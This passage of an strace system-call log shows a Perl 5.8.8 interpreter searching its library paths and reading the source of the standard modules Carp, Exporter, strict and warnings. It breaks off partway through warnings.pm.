dl_install_xsub(\"${module}::bootstrap\", $boot_symbol_ref, $file);\n\n    # See comment block above\n    return &$xs(@_);\n\n  retry:\n    my $bootstrap_inherit = DynaLoader->can(\'bootstrap_inherit\') || \n                            XSLoader->can(\'bootstrap_inherit\');\n    goto &$bootstrap_inherit;\n}\n\n# Versions of DynaLoader prior to 5.6.0 don\'t have this function.\nsub bootstrap_inherit {\n    package DynaLoader;\n\n    my $module = $_[0];\n    local *DynaLoader::isa = *{\"$module\\::ISA\"};\n    local @DynaLoader::isa = (@DynaLoader::isa, \'DynaLoader\');\n    # Cannot goto due to delocalization.  Will report errors on a wrong line?\n    require DynaLoader;\n    DynaLoader::bootstrap(@_);\n}\n\n1;\n\n__END__\n\n", 4096) = 3408
12646 20:28:53.775779 brk(0x8195000)    = 0x8195000
12646 20:28:53.776133 _llseek(8, 3407, [3407], SEEK_SET) = 0
12646 20:28:53.776150 _llseek(8, 0, [3407], SEEK_CUR) = 0
12646 20:28:53.776161 close(8)          = 0
12646 20:28:53.776206 stat64("/etc/perl/Carp.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.776221 stat64("/etc/perl/Carp.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.776235 stat64("/usr/local/lib/perl/5.8.8/Carp.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.776248 stat64("/usr/local/lib/perl/5.8.8/Carp.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.776262 stat64("/usr/local/share/perl/5.8.8/Carp.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.776284 stat64("/usr/local/share/perl/5.8.8/Carp.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.776299 stat64("/usr/lib/perl5/Carp.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.776311 stat64("/usr/lib/perl5/Carp.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.776324 stat64("/usr/share/perl5/Carp.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.776336 stat64("/usr/share/perl5/Carp.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.776349 stat64("/usr/lib/perl/5.8/Carp.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.776362 stat64("/usr/lib/perl/5.8/Carp.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.776376 stat64("/usr/share/perl/5.8/Carp.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.776389 stat64("/usr/share/perl/5.8/Carp.pm", {st_mode=S_IFREG|0644, st_size=4112, ...}) = 0
12646 20:28:53.776410 open("/usr/share/perl/5.8/Carp.pm", O_RDONLY|O_LARGEFILE) = 8
12646 20:28:53.776424 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd53b18) = -1 ENOTTY (Inappropriate ioctl for device)
12646 20:28:53.776436 _llseek(8, 0, [0], SEEK_CUR) = 0
12646 20:28:53.776453 read(8, "package Carp;\n\nour $VERSION = \'1.04\';\n\n# This package is heavily used. Be small. Be fast. Be good.\n\n# Comments added by Andy Wardley <abw@kfs.org> 09-Apr-98, based on an\n# _almost_ complete understanding of the package.  Corrections and\n# comments are welcome.\n\n# The members of %Internal are packages that are internal to perl.\n# Carp will not report errors from within these packages if it\n# can.  The members of %CarpInternal are internal to Perl\'s warning\n# system.  Carp will not report errors from within these packages\n# either, and will not report calls *to* these packages for carp and\n# croak.  They replace $CarpLevel, which is deprecated.    The\n# $Max(EvalLen|(Arg(Len|Nums)) variables are used to specify how the eval\n# text and function arguments should be formatted when printed.\n\n# Comments added by Jos I. Boumans <kane@dwim.org> 11-Aug-2004\n# I can not get %CarpInternal or %Internal to work as advertised,\n# therefor leaving it out of the below documentation.\n# $CarpLevel may be decprecated according to the last comment, but\n# after 6 years, it\'s still around and in heavy use ;)\n\n$CarpInternal{Carp}++;\n$CarpInternal{warnings}++;\n$CarpLevel = 0;     # How many extra package levels to skip on carp.\n                    # How many calls to skip on confess.\n                    # Reconciling these notions is hard, use\n                    # %Internal and %CarpInternal instead.\n$MaxEvalLen = 0;    # How much eval \'...text...\' to show. 0 = all.\n$MaxArgLen = 64;    # How much of each argument to print. 0 = all.\n$MaxArgNums = 8;    # How many arguments to print. 0 = all.\n$Verbose = 0;       # If true then make shortmess call longmess instead\n\nrequire Exporter;\n@ISA = (\'Exporter\');\n@EXPORT = qw(confess croak carp);\n@EXPORT_OK = qw(cluck verbose longmess shortmess);\n@EXPORT_FAIL = qw(verbose);\t# hook to enable verbose mode\n\n# if the caller specifies verbose usage (\"perl -MCarp=verbose script.pl\")\n# then the following method will be called by the Exporter which knows\n# to do this thanks to @EXPORT_FAIL, above.  $_[1] will contain the word\n# \'verbose\'.\n\nsub export_fail {\n    shift;\n    $Verbose = shift if $_[0] eq \'verbose\';\n    return @_;\n}\n\n# longmess() crawls all the way up the stack reporting on all the function\n# calls made.  The error string, $error, is originally constructed from the\n# arguments passed into longmess() via confess(), cluck() or shortmess().\n# This gets appended with the stack trace messages which are generated for\n# each function call on the stack.\n\nsub longmess {\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    if ($Internal{$call_pack} or $CarpInternal{$call_pack}) {\n      return longmess_heavy(@_);\n    }\n    else {\n      local $CarpLevel = $CarpLevel + 1;\n      return longmess_heavy(@_);\n    }\n}\n\n# shortmess() is called by carp() and croak() to skip all the way up to\n# the top-level caller\'s package and report the error from there.  confess()\n# and cluck() generate a full stack trace so they call longmess() to\n# generate that.  In verbose mode shortmess() calls longmess() so\n# you always get a stack trace\n\nsub shortmess {\t# Short-circuit &longmess if called via multiple packages\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    local @CARP_NOT = caller();\n    shortmess_heavy(@_);\n}\n\n# the following four functions call longmess() or shortmess() depending on\n# whether they should generate a full stack trace (confess() and cluck())\n# or simply report the caller\'s package (croak() and carp()), respectively.\n# confess() and croak() die, carp() and cluck() warn.\n\nsub croak   { die  shortmess @_ }\nsub confess { die  longmess  @_ }\nsub carp    { warn shortmess @_ }\nsub cluck   { warn lon", 4096) = 4096
12646 20:28:53.776985 read(8, "gmess  @_ }\n\n1;\n", 4096) = 16
12646 20:28:53.777014 read(8, "", 4096) = 0
12646 20:28:53.777025 close(8)          = 0
12646 20:28:53.777047 stat64("/etc/perl/Exporter.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.777060 stat64("/etc/perl/Exporter.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.777074 stat64("/usr/local/lib/perl/5.8.8/Exporter.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.777086 stat64("/usr/local/lib/perl/5.8.8/Exporter.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.777100 stat64("/usr/local/share/perl/5.8.8/Exporter.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.777117 stat64("/usr/local/share/perl/5.8.8/Exporter.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.777130 stat64("/usr/lib/perl5/Exporter.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.777142 stat64("/usr/lib/perl5/Exporter.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.777155 stat64("/usr/share/perl5/Exporter.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.777167 stat64("/usr/share/perl5/Exporter.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.777180 stat64("/usr/lib/perl/5.8/Exporter.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.777193 stat64("/usr/lib/perl/5.8/Exporter.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.777206 stat64("/usr/share/perl/5.8/Exporter.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.777219 stat64("/usr/share/perl/5.8/Exporter.pm", {st_mode=S_IFREG|0644, st_size=2218, ...}) = 0
12646 20:28:53.777240 open("/usr/share/perl/5.8/Exporter.pm", O_RDONLY|O_LARGEFILE) = 8
12646 20:28:53.777254 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd53b18) = -1 ENOTTY (Inappropriate ioctl for device)
12646 20:28:53.777300 _llseek(8, 0, [0], SEEK_CUR) = 0
12646 20:28:53.777335 read(8, "package Exporter;\n\nrequire 5.006;\n\n# Be lean.\n#use strict;\n#no strict \'refs\';\n\nour $Debug = 0;\nour $ExportLevel = 0;\nour $Verbose ||= 0;\nour $VERSION = \'5.58\';\nour (%Cache);\n$Carp::Internal{Exporter} = 1;\n\nsub as_heavy {\n  require Exporter::Heavy;\n  # Unfortunately, this does not work if the caller is aliased as *name = \\&foo\n  # Thus the need to create a lot of identical subroutines\n  my $c = (caller(1))[3];\n  $c =~ s/.*:://;\n  \\&{\"Exporter::Heavy::heavy_$c\"};\n}\n\nsub export {\n  goto &{as_heavy()};\n}\n\nsub import {\n  my $pkg = shift;\n  my $callpkg = caller($ExportLevel);\n\n  if ($pkg eq \"Exporter\" and @_ and $_[0] eq \"import\") {\n    *{$callpkg.\"::import\"} = \\&import;\n    return;\n  }\n\n  # We *need* to treat @{\"$pkg\\::EXPORT_FAIL\"} since Carp uses it :-(\n  my($exports, $fail) = (\\@{\"$pkg\\::EXPORT\"}, \\@{\"$pkg\\::EXPORT_FAIL\"});\n  return export $pkg, $callpkg, @_\n    if $Verbose or $Debug or @$fail > 1;\n  my $export_cache = ($Cache{$pkg} ||= {});\n  my $args = @_ or @_ = @$exports;\n\n  local $_;\n  if ($args and not %$export_cache) {\n    s/^&//, $export_cache->{$_} = 1\n      foreach (@$exports, @{\"$pkg\\::EXPORT_OK\"});\n  }\n  my $heavy;\n  # Try very hard not to use {} and hence have to  enter scope on the foreach\n  # We bomb out of the loop with last as soon as heavy is set.\n  if ($args or $fail) {\n    ($heavy = (/\\W/ or $args and not exists $export_cache->{$_}\n               or @$fail and $_ eq $fail->[0])) and last\n                 foreach (@_);\n  } else {\n    ($heavy = /\\W/) and last\n      foreach (@_);\n  }\n  return export $pkg, $callpkg, ($args ? @_ : ()) if $heavy;\n  local $SIG{__WARN__} = \n\tsub {require Carp; &Carp::carp};\n  # shortcut for the common case of no type character\n  *{\"$callpkg\\::$_\"} = \\&{\"$pkg\\::$_\"} foreach @_;\n}\n\n# Default methods\n\nsub export_fail {\n    my $self = shift;\n    @_;\n}\n\n# Unfortunately, caller(1)[3] \"does not work\" if the caller is aliased as\n# *name = \\&foo.  Thus the need to create a lot of identical subroutines\n# Otherwise we could have aliased them to export().\n\nsub export_to_level {\n  goto &{as_heavy()};\n}\n\nsub export_tags {\n  goto &{as_heavy()};\n}\n\nsub export_ok_tags {\n  goto &{as_heavy()};\n}\n\nsub require_version {\n  goto &{as_heavy()};\n}\n\n1;\n__END__\n\n", 4096) = 2218
12646 20:28:53.777789 _llseek(8, 2217, [2217], SEEK_SET) = 0
12646 20:28:53.781773 _llseek(8, 0, [2217], SEEK_CUR) = 0
12646 20:28:53.781799 close(8)          = 0
12646 20:28:53.781876 stat64("/etc/perl/strict.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.781892 stat64("/etc/perl/strict.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.781909 stat64("/usr/local/lib/perl/5.8.8/strict.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.781922 stat64("/usr/local/lib/perl/5.8.8/strict.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.781936 stat64("/usr/local/share/perl/5.8.8/strict.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.781948 stat64("/usr/local/share/perl/5.8.8/strict.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.781962 stat64("/usr/lib/perl5/strict.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.781973 stat64("/usr/lib/perl5/strict.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.781986 stat64("/usr/share/perl5/strict.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.781998 stat64("/usr/share/perl5/strict.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.782011 stat64("/usr/lib/perl/5.8/strict.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.782023 stat64("/usr/lib/perl/5.8/strict.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.782036 stat64("/usr/share/perl/5.8/strict.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.782048 stat64("/usr/share/perl/5.8/strict.pm", {st_mode=S_IFREG|0644, st_size=599, ...}) = 0
12646 20:28:53.782069 open("/usr/share/perl/5.8/strict.pm", O_RDONLY|O_LARGEFILE) = 8
12646 20:28:53.782084 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd53b18) = -1 ENOTTY (Inappropriate ioctl for device)
12646 20:28:53.782096 _llseek(8, 0, [0], SEEK_CUR) = 0
12646 20:28:53.782114 read(8, "package strict;\n\n$strict::VERSION = \"1.03\";\n\nmy %bitmask = (\nrefs => 0x00000002,\nsubs => 0x00000200,\nvars => 0x00000400\n);\n\nsub bits {\n    my $bits = 0;\n    my @wrong;\n    foreach my $s (@_) {\n\tpush @wrong, $s unless exists $bitmask{$s};\n        $bits |= $bitmask{$s} || 0;\n    }\n    if (@wrong) {\n        require Carp;\n        Carp::croak(\"Unknown \'strict\' tag(s) \'@wrong\'\");\n    }\n    $bits;\n}\n\nmy $default_bits = bits(qw(refs subs vars));\n\nsub import {\n    shift;\n    $^H |= @_ ? bits(@_) : $default_bits;\n}\n\nsub unimport {\n    shift;\n    $^H &= ~ (@_ ? bits(@_) : $default_bits);\n}\n\n1;\n__END__\n\n", 4096) = 599
12646 20:28:53.782333 _llseek(8, 598, [598], SEEK_SET) = 0
12646 20:28:53.782361 _llseek(8, 0, [598], SEEK_CUR) = 0
12646 20:28:53.782371 close(8)          = 0
12646 20:28:53.782409 stat64("/etc/perl/warnings.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.782424 stat64("/etc/perl/warnings.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.782437 stat64("/usr/local/lib/perl/5.8.8/warnings.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.782449 stat64("/usr/local/lib/perl/5.8.8/warnings.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.782463 stat64("/usr/local/share/perl/5.8.8/warnings.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.782475 stat64("/usr/local/share/perl/5.8.8/warnings.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.782489 stat64("/usr/lib/perl5/warnings.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.782501 stat64("/usr/lib/perl5/warnings.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.782514 stat64("/usr/share/perl5/warnings.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.782525 stat64("/usr/share/perl5/warnings.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.782538 stat64("/usr/lib/perl/5.8/warnings.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.782551 stat64("/usr/lib/perl/5.8/warnings.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.782564 stat64("/usr/share/perl/5.8/warnings.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.782576 stat64("/usr/share/perl/5.8/warnings.pm", {st_mode=S_IFREG|0644, st_size=13018, ...}) = 0
12646 20:28:53.782605 open("/usr/share/perl/5.8/warnings.pm", O_RDONLY|O_LARGEFILE) = 8
12646 20:28:53.782619 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd53b18) = -1 ENOTTY (Inappropriate ioctl for device)
12646 20:28:53.782631 _llseek(8, 0, [0], SEEK_CUR) = 0
12646 20:28:53.782649 read(8, "# -*- buffer-read-only: t -*-\n# !!!!!!!   DO NOT EDIT THIS FILE   !!!!!!!\n# This file was created by warnings.pl\n# Any changes made here will be lost.\n#\n\npackage warnings;\n\nour $VERSION = \'1.05\';\n\nuse Carp ();\n\nour %Offsets = (\n\n    # Warnings Categories added in Perl 5.008\n\n    \'all\'\t\t=> 0,\n    \'closure\'\t\t=> 2,\n    \'deprecated\'\t=> 4,\n    \'exiting\'\t\t=> 6,\n    \'glob\'\t\t=> 8,\n    \'io\'\t\t=> 10,\n    \'closed\'\t\t=> 12,\n    \'exec\'\t\t=> 14,\n    \'layer\'\t\t=> 16,\n    \'newline\'\t\t=> 18,\n    \'pipe\'\t\t=> 20,\n    \'unopened\'\t\t=> 22,\n    \'misc\'\t\t=> 24,\n    \'numeric\'\t\t=> 26,\n    \'once\'\t\t=> 28,\n    \'overflow\'\t\t=> 30,\n    \'pack\'\t\t=> 32,\n    \'portable\'\t\t=> 34,\n    \'recursion\'\t\t=> 36,\n    \'redefine\'\t\t=> 38,\n    \'regexp\'\t\t=> 40,\n    \'severe\'\t\t=> 42,\n    \'debugging\'\t\t=> 44,\n    \'inplace\'\t\t=> 46,\n    \'internal\'\t\t=> 48,\n    \'malloc\'\t\t=> 50,\n    \'signal\'\t\t=> 52,\n    \'substr\'\t\t=> 54,\n    \'syntax\'\t\t=> 56,\n    \'ambiguous\'\t\t=> 58,\n    \'bareword\'\t\t=> 60,\n    \'digit\'\t\t=> 62,\n    \'parenthesis\'\t=> 64,\n    \'precedence\'\t=> 66,\n    \'printf\'\t\t=> 68,\n    \'prototype\'\t\t=> 70,\n    \'qw\'\t\t=> 72,\n    \'reserved\'\t\t=> 74,\n    \'semicolon\'\t\t=> 76,\n    \'taint\'\t\t=> 78,\n    \'threads\'\t\t=> 80,\n    \'uninitialized\'\t=> 82,\n    \'unpack\'\t\t=> 84,\n    \'untie\'\t\t=> 86,\n    \'utf8\'\t\t=> 88,\n    \'void\'\t\t=> 90,\n    \'y2k\'\t\t=> 92,\n  );\n\nour %Bits = (\n    \'all\'\t\t=> \"\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x15\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\x54\\x55\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x54\\x05\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x40", 4096) = 4096
12646 20:28:53.783087 brk(0x81b6000)    = 0x81b6000
12646 20:28:53.783104 brk(0x81b5000)    = 0x81b5000
12646 20:28:53.783181 read(8, "\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x55\\x15\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\", # [46]\n  );\n\nour %DeadBits = (\n    \'all\'\t\t=> \"\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\x2a\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\xa8\\xaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    